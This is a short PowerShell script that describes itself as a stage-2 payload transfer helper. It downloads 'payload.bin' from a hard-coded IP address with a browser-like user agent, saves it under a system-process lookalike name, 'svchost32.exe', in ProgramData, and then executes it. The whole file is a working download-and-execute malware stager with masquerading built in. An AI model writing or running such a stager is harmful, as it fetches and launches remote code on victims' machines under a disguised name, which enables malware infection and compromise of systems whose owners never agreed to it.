<#
.SYNOPSIS
    Stage 2 payload transfer helper.

.DESCRIPTION
    Downloads the staged artefact to a per-user drop path.
    The destination is verified before the launcher runs.
#>
[CmdletBinding()]
param(
    [string]$RemoteUrl = 'http://192.0.2.47/payload.bin',
    [string]$OutputPath = "C:\ProgramData\svchost32.exe",
    [int]$ConnectionTimeout = 86,
    [string]$RequestAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
)
$ErrorActionPreference = "Stop"

function Invoke-Stage2Download {
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$FetchResult = Invoke-Stage2Download -SourceUrl $RemoteUrl -DestinationPath $OutputPath -TimeoutSec $ConnectionTimeout -UserAgent $RequestAgent
if ($FetchResult) {
    Start-Process -FilePath $OutputPath
}

Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
$StageMarker = "stage-17"
